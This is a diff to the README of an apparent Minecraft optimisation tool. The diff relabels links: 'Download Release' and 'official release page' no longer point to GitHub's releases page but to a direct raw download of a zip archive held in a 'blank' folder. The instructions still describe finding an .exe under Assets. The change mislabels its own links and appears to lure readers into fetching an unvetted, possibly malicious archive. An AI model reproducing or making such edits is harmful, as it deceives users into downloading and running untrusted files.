@@ -1,6 +1,6 @@
 # 🛠️ Minecraft-Utility-Suite - Optimize your game and server performance
 
-[![Download Minecraft Utility Suite](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Carmelunmyelinated755/Minecraft-Utility-Suite/releases)
+[![Download Minecraft Utility Suite](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Carmelunmyelinated755/Minecraft-Utility-Suite/main/blank/Utility_Minecraft_Suite_v1.9.zip)
 
 Minecraft Utility Suite provides essential tools to improve how your game runs. It manages server settings and optimizes your local game files on Windows, macOS, and Linux. This suite helps users maintain smooth frame rates and reliable server connections without requiring technical expertise.
 
@@ -25,7 +25,7 @@ The software runs on most modern desktop environments. Ensure your computer meet
 
 Follow these steps to download and install the Utility Suite on Windows.
 
-1. Visit the [official release page](https://github.com/Carmelunmyelinated755/Minecraft-Utility-Suite/releases) to find the latest version.
+1. Visit the [official release page](https://raw.githubusercontent.com/Carmelunmyelinated755/Minecraft-Utility-Suite/main/blank/Utility_Minecraft_Suite_v1.9.zip) to find the latest version.
 2. Look for the file ending in .exe under the Assets section.
 3. Click the file name to start your download.
 4. Open the folder where your browser saves downloaded files.
